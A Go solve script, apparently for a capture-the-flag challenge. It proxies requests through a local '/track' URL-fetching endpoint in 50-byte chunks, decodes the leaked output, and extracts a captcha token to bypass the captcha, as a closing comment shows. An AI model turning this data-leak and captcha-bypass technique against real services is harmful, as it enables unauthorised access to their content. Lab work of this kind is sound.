package main

import (
	"encoding/base64"
	"encoding/hex"
	"io"
	"log"
	"mime"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

func main() {

	err := http.ListenAndServe(":8080", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {

		if r.URL.Path == "/get-captcha-token" {

			idx := 6655 // magic offset to algin, we need the whole token

			raw := getBytesOfURL("http://localhost:8080/", idx, 50)
			w.Write([]byte(raw))
			return
		}

		mediaType, _, _ := mime.ParseMediaType(r.URL.Path)
		w.Header().Add("content-type", mediaType)

		idx := 0
		for range 10000 {

			url := "http://localhost:8080" + r.URL.Path + "?" + r.URL.RawQuery
			raw := getBytesOfURL(url, idx, 50)

			if len(raw) != 0 {
				w.Write([]byte(raw))
			} else {
				break
			}

			idx += 50
		}
	}))
	if err != nil {
		log.Fatal(err)
	}

	// how to solve ->
	// http://localhost:8080/request?captcha_token=24cf507b437d644d78ff8900bd6896d0&captcha=HA745Q&name=x
}

func getBytesOfURL(urlx string, start, num int) []byte {

	form := url.Values{}

	form.Add("url", urlx)
	form.Add("start", strconv.Itoa(start))
	form.Add("end", strconv.Itoa(start+num))

	resp, _ := http.PostForm("http://localhost:50000/track", form)

	allbytes, _ := io.ReadAll(resp.Body)
	body := string(allbytes)

	payload := strings.Split(strings.Split(body, `13px;">`)[1], `</pre`)[0]
	// log.Println(idx, "payload, ", payload)
	hexx, _ := base64.URLEncoding.DecodeString(payload)
	raw, _ := hex.DecodeString(string(hexx))

	return raw
}
